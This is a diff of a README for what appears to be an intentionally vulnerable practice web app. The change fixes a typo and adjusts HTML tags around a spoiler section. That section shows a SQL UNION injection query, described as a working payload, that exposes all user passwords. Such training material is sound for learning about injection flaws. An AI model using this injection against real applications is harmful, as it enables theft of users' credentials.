@@ -33,7 +33,7 @@ The application is then accessible on [http://localhost:8080/](http://localhost:
 ## Exploit
 
 <details>
-  <summary>Warninng ! Contains spoilers !</summary>
+  <summary>Warning ! Contains spoilers !</summary><p>
     Here is an example of a working payload, esposing all passwords in the table:
 
     ```sql
@@ -45,4 +45,4 @@ The application is then accessible on [http://localhost:8080/](http://localhost:
     ```sql
     SELECT id, nickname, email FROM users WHERE nickname LIKE "%nothing%" UNION SELECT pass, nickname, email FROM users#%"
     ```
-</details>
+</p></details>
